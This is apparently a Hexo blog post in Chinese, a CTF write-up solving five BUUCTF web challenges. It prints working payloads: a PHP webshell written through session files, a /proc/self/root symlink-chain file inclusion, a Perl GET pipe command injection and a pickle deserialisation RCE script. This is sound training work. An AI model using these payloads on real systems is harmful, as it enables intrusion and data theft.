@@ -1,0 +1,815 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="-web -write up -ctf," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="mrl64's Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="前言 养好状态准备打MRCTF和ISCC，继续刷题">
+<meta property="og:type" content="article">
+<meta property="og:title" content="buu练习8">
+<meta property="og:url" content="http://example.com/2022/04/16/buu%E7%BB%83%E4%B9%A08/index.html">
+<meta property="og:site_name" content="mrl64&#39;s Blog">
+<meta property="og:description" content="前言 养好状态准备打MRCTF和ISCC，继续刷题">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s2.loli.net/2022/04/16/BqE1UjaWmT8lPQf.png">
+<meta property="article:published_time" content="2022-04-16T07:51:06.000Z">
+<meta property="article:modified_time" content="2022-04-16T11:55:04.613Z">
+<meta property="article:author" content="liszt_lin">
+<meta property="article:tag" content="-web -write up -ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2022/04/16/BqE1UjaWmT8lPQf.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2022/04/16/buu练习8/"/>
+
+
+
+
+
+  <title>buu练习8 | mrl64's Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">mrl64's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/16/buu%E7%BB%83%E4%B9%A08/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="mrl64's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">buu练习8</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-04-16T15:51:06+08:00">
+                2022-04-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
+<p>养好状态准备打MRCTF和ISCC，继续刷题</p>
+</blockquote>
+<span id="more"></span>
+
+<h1 id="GYCTF2020-EasyThinking"><a href="#GYCTF2020-EasyThinking" class="headerlink" title="[GYCTF2020]EasyThinking"></a>[GYCTF2020]EasyThinking</h1><p>根据题目判断本题要利用到ThinkingPHP的漏洞进行攻击，进入网页先随便进入个不存在的路由，获得版本为ThinkPHP V6.0.0。信息搜集发现存在<code>www.zip</code>源码泄露。</p>
+<p>接着去找对应版本的漏洞，发现一个反序列化漏洞和任意文件操作漏洞，通过对比源码以及版本判断本题应该是任意文件操作漏洞，参考文章：<br><a target="_blank" rel="noopener" href="https://www.yisu.com/zixun/328521.html">ThinkPHP6任意文件操作漏洞的示例分析</a></p>
+<p>我们翻阅<code>vendor/topthink/framework/src/think/session/driver/File.php</code>，发现文件驱动部分代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public function __construct(App $app, array $config = [])</span><br><span class="line">&#123;</span><br><span class="line">    $this-&gt;config = array_merge($this-&gt;config, $config);</span><br><span class="line"></span><br><span class="line">    if (empty($this-&gt;config[&#x27;path&#x27;])) &#123;</span><br><span class="line">        $this-&gt;config[&#x27;path&#x27;] = $app-&gt;getRootPath() . &#x27;runtime&#x27; . DIRECTORY_SEPARATOR . &#x27;session&#x27; . DIRECTORY_SEPARATOR;</span><br><span class="line">    &#125; elseif (substr($this-&gt;config[&#x27;path&#x27;], -1) != DIRECTORY_SEPARATOR) &#123;</span><br><span class="line">        $this-&gt;config[&#x27;path&#x27;] .= DIRECTORY_SEPARATOR;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $this-&gt;init();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>文件保存在<code>/runtime/session</code>中。接下来审计各个路由的功能，发现<br><code>app/home/controller/Member.php</code>中存在的search函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">public function search()</span><br><span class="line">    &#123;</span><br><span class="line">        if (Request::isPost())&#123;</span><br><span class="line">            if (!session(&#x27;?UID&#x27;))</span><br><span class="line">            &#123;</span><br><span class="line">                return redirect(&#x27;/home/member/login&#x27;);            </span><br><span class="line">            &#125;</span><br><span class="line">            $data = input(&quot;post.&quot;);</span><br><span class="line">            $record = session(&quot;Record&quot;);</span><br><span class="line">            if (!session(&quot;Record&quot;))</span><br><span class="line">            &#123;</span><br><span class="line">                session(&quot;Record&quot;,$data[&quot;key&quot;]);</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                $recordArr = explode(&quot;,&quot;,$record);</span><br><span class="line">                $recordLen = sizeof($recordArr);</span><br><span class="line">                if ($recordLen &gt;= 3)&#123;</span><br><span class="line">                    array_shift($recordArr);</span><br><span class="line">                    session(&quot;Record&quot;,implode(&quot;,&quot;,$recordArr) . &quot;,&quot; . $data[&quot;key&quot;]);</span><br><span class="line">                    return View::fetch(&quot;result&quot;,[&quot;res&quot; =&gt; &quot;There&#x27;s nothing here&quot;]);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            session(&quot;Record&quot;,$record . &quot;,&quot; . $data[&quot;key&quot;]);</span><br><span class="line">            return View::fetch(&quot;result&quot;,[&quot;res&quot; =&gt; &quot;There&#x27;s nothing here&quot;]);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return View(&quot;search&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>search函数会把搜索框POST数据存到session文件里面，生成的session文件名规则即为sess_PHPSESSID。</p>
+<p>接下来我们注册账号并登录，在搜索时进行抓包，写入一句马，将PHPSESSID改为32位的php文件名，key值为写入内容：<br><img src="https://s2.loli.net/2022/04/16/BqE1UjaWmT8lPQf.png"></p>
+<p>查看<code>runtime/session/sess_1234567890123456789012345678.php</code>，发现写入成功，查看disable_functions，命令执行函数被禁用。</p>
+<p>那么我们先再写入一个一句马，接着去github上下载一个exploit.php这个poc，将11行改为<code>pwn(/readflag)</code>，上传到<code>/var/tmp</code>中。接着用上面的方法继续写入文件使得这个poc被包含：<br><code>key=&lt;?php include(&#39;/var/tmp/exploit.php&#39;);?&gt;</code></p>
+<p>最后返回sess_1234567890123456789012345678.php，获得flag。</p>
+<h1 id="FireshellCTF2020-Caas"><a href="#FireshellCTF2020-Caas" class="headerlink" title="[FireshellCTF2020]Caas"></a>[FireshellCTF2020]Caas</h1><p>进入网页，发现要我们输入内容进行编译，那么我们先随便输入点php代码，发现他不能识别这个代码，那么这就不是php编译器，那么我们进行各种尝试。</p>
+<p>最后发现c语言成功编译，并且生成了ELF文件，并且成功输出了<code>hello world</code>。啊这不是web题吗，为啥使用的是c语言啊，难不成我还得去利用c的漏洞？</p>
+<p>尝试调用shell读取flag，无果，那么尝试文件包含：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;/etc/passwd&quot;</span><br></pre></td></tr></table></figure>
+
+<p>发现文件成功读取，那么我们读取<code>/flag</code>，成功得到flag。</p>
+<h1 id="WMCTF2020-Make-PHP-Great-Again"><a href="#WMCTF2020-Make-PHP-Great-Again" class="headerlink" title="[WMCTF2020]Make PHP Great Again"></a>[WMCTF2020]Make PHP Great Again</h1><p>审计代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">require_once &#x27;flag.php&#x27;;</span><br><span class="line">if(isset($_GET[&#x27;file&#x27;])) &#123;</span><br><span class="line">  require_once $_GET[&#x27;file&#x27;];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这题的代码很眼熟，就感觉我在哪里见过类似的，后来翻了翻我最近的记录，发现这不是p牛去年写的使用多级软连接绕过文件判断吗，我们就用这个方法来绕过。</p>
+<p>简单介绍下这个trick，就是正常情况下php会将用户输入的文件名进行resolve，转化成绝对路径，这时<code>../</code>、<code>./</code>都会进行计算，但如果软连接跳转次数达到一个上限，那么linux的lstat函数就会出错，导致php计算出的绝对路径和原始路径不同，从而绕过require_once。</p>
+<p>linux下最常用的软连接就是<code>/proc/self/root</code>，这个路径指向根目录，因此我们构建payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure>
+
+<p>解码base64得到flag。</p>
+<h1 id="HITCON-2017-SSRFme"><a href="#HITCON-2017-SSRFme" class="headerlink" title="[HITCON 2017]SSRFme"></a>[HITCON 2017]SSRFme</h1><p>审计源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    if (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123;</span><br><span class="line">        $http_x_headers = explode(&#x27;,&#x27;, $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]);</span><br><span class="line">        $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $http_x_headers[0];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    echo $_SERVER[&quot;REMOTE_ADDR&quot;];</span><br><span class="line"></span><br><span class="line">    $sandbox = &quot;sandbox/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line"></span><br><span class="line">    $data = shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));</span><br><span class="line">    $info = pathinfo($_GET[&quot;filename&quot;]);</span><br><span class="line">    $dir  = str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;]));</span><br><span class="line">    @mkdir($dir);</span><br><span class="line">    @chdir($dir);</span><br><span class="line">    @file_put_contents(basename($info[&quot;basename&quot;]), $data);</span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
+
+<p>首先代码创建了个sandbox文件夹，路径为sandbox/加上MD5加密过后的orange加页面输出的ip。</p>
+<p>接着是关键部分，我们首先要了解peal函数中get命令漏洞：</p>
+<blockquote>
+<p>perl函数看到要打开的文件名中如果以管道符（键盘上那个竖杠 |）结尾，就会中断原有打开文件操作，并且把这个文件名当作一个命令来执行，并且将命令的执行结果作为这个文件的内容写入。这个命令的执行权限是当前的登录者。如果你执行这个命令，你会看到perl程序运行的结果。</p>
+</blockquote>
+<p>那么我们就可以在url参数中传入读取flag的命令，然后写进文件中，我们在打开这个文件就可以获取flag了。</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=/&amp;filename=a</span><br></pre></td></tr></table></figure>
+
+<p>查看在根目下的文件，发现readflag文件，因此使用bash命令执行readflag。我们需要先创建一个与我们需要执行命令相同的文件，然后使用管道截获该流程，使之为命令的执行，这里要创建一模一样的文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=file:bash -c /readflag|&amp;filename=bash -c /readflag|</span><br></pre></td></tr></table></figure>
+
+<p>最后修改存储的文件，并读取flag输入到存储的文件中去，读取flag：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=file:bash -c /readflag|&amp;filename=mrl64</span><br></pre></td></tr></table></figure>
+
+<h1 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h1><p>进入网页告诉我们要买到lv6爆破B站，宣告ikun主权，太爱了。然后注册账号登录，发现自己有1000元，好结果找了商店找了十页都没找到lv6，太爱了。</p>
+<p>直接写脚本找lv6：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url = &quot;http://47a66447-4bfa-417f-9165-0bccf73f8701.node4.buuoj.cn:81/shop&quot;</span><br><span class="line">params = &#123;&quot;page&quot;: &quot;&quot;&#125;</span><br><span class="line">flag= &quot;&quot;</span><br><span class="line">for i in range(1, 500):</span><br><span class="line">    params[&quot;page&quot;] = i</span><br><span class="line">    r = requests.get(url, params=params)</span><br><span class="line">    time.sleep(1)//buu访问限制</span><br><span class="line">    if &quot;lv6.png&quot; in r.text:</span><br><span class="line">        print(i)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>
+
+<p>最后找到在181页，兴冲冲进去发现怎么价格这么臭啊(bushi，1145141919元根本买不起，怀疑存在逻辑漏洞，前端更改相关参数，发现更改折扣后不是回显操作失败，而是只允许管理员访问。</p>
+<p>没有发现登录漏洞，储存中发现JWT，应该是更改jwt，更改username为admin后发现依然无法购买成功，那应该是存在密钥的，使用c-jwt-cracker工具进行爆破，爆出私钥为1Kun。</p>
+<p>更改jwt后成功买到6级号，但是还要我们成为大会员，麻了怎么还有，当ikun好累。点击按钮发现没用，查看源码发现存在<code>/static/asd1f654e683wq/www.zip</code>，下载源码。</p>
+<p>Admin.py：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import tornado.web</span><br><span class="line">from sshop.base import BaseHandler</span><br><span class="line">import pickle</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class AdminHandler(BaseHandler):</span><br><span class="line">    @tornado.web.authenticated</span><br><span class="line">    def get(self, *args, **kwargs):</span><br><span class="line">        if self.current_user == &quot;admin&quot;:</span><br><span class="line">            return self.render(&#x27;form.html&#x27;, res=&#x27;This is Black Technology!&#x27;, member=0)</span><br><span class="line">        else:</span><br><span class="line">            return self.render(&#x27;no_ass.html&#x27;)</span><br><span class="line"></span><br><span class="line">    @tornado.web.authenticated</span><br><span class="line">    def post(self, *args, **kwargs):</span><br><span class="line">        try:</span><br><span class="line">            become = self.get_argument(&#x27;become&#x27;)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            return self.render(&#x27;form.html&#x27;, res=p, member=1)</span><br><span class="line">        except:</span><br><span class="line">            return self.render(&#x27;form.html&#x27;, res=&#x27;This is Black Technology!&#x27;, member=0)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>好家伙看到tornado本来以为是模板注入，后来发现这里是pickle反序列化漏洞。参考文章：<br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/252189.html">Python Pickle反序列化漏洞</a></p>
+<p>之后应该也会写一个pickle反序列化的博客。</p>
+<p>那么根据文章内容，我们构造poc：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import urllib</span><br><span class="line">import commands</span><br><span class="line"></span><br><span class="line">class payload(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (commands.getoutput,(&#x27;cat /flag.txt&#x27;,))</span><br><span class="line"></span><br><span class="line">a = payload()</span><br><span class="line">print urllib.quote(pickle.dumps(a))</span><br></pre></td></tr></table></figure>
+
+<p>最后抓包并将payload传值给become即可获取flag】。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web-write-up-ctf/" rel="tag"># -web -write up -ctf</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2022/04/14/buu%E7%BB%83%E4%B9%A07/" rel="next" title="buu练习7">
+                <i class="fa fa-chevron-left"></i> buu练习7
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">65</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">25</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#GYCTF2020-EasyThinking"><span class="nav-number"></span> <span class="nav-text">[GYCTF2020]EasyThinking</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#FireshellCTF2020-Caas"><span class="nav-number"></span> <span class="nav-text">[FireshellCTF2020]Caas</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WMCTF2020-Make-PHP-Great-Again"><span class="nav-number"></span> <span class="nav-text">[WMCTF2020]Make PHP Great Again</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#HITCON-2017-SSRFme"><span class="nav-number"></span> <span class="nav-text">[HITCON 2017]SSRFme</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun"><span class="nav-number"></span> <span class="nav-text">[CISCN2019 华北赛区 Day1 Web2]ikun</span></a></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">liszt_lin</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
